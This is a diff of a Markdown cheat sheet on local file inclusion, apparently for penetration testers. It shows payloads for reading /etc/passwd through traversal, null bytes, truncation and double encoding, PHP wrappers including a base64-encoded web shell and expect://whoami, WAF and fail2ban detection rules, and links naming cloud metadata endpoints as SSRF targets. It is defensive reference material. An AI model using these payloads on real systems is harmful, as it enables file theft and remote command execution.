@@ -19,19 +19,19 @@
 
 ### Null Byte Injection (PHP < 5.3.4)
 
-```
+```txt
 ?file=../../../../etc/passwd%00
 ```
 
 ### Path Truncation
 
-```
+```txt
 ?file=../../../../etc/passwd................................................................
 ```
 
 ### PHP Wrappers
 
-```
+```txt
 php://filter/convert.base64-encode/resource=config.php
 data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
 expect://whoami
@@ -39,7 +39,7 @@ expect://whoami
 
 ### Double Encoding
 
-```
+```txt
 ?file=%252e%252e%252f%252e%252e%252fetc%252fpasswd
 ```
 
@@ -481,7 +481,7 @@ failregex = ^<HOST> .* "GET .*(\.\./|etc/passwd|php://|file://).*"
 
 **WAF Rules**
 
-```
+```txt
 # ModSecurity rules for LFI
 SecRule ARGS "@rx (?:\.\./|etc/passwd|php://|file://)" \
     "id:1000,phase:2,block,log,msg:'LFI Attempt Detected'"
@@ -501,3 +501,10 @@ SecRule ARGS "@rx (?:\.\./|etc/passwd|php://|file://)" \
 ---
 
 **Remember:** This cheat sheet is for authorized security testing and defense purposes only. Unauthorized access to systems is illegal.
+
+## Resources
+
+- [PayloadsAllTheThings — File Inclusion](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion) — LFI/RFI payloads
+- [HackTricks — File Inclusion](https://book.hacktricks.xyz/pentesting-web/file-inclusion) — LFI/RFI techniques
+- [AWS instance metadata](http://169.254.169.254/latest/meta-data/) — SSRF target
+- [GCP metadata](http://metadata.google.internal/) — SSRF target
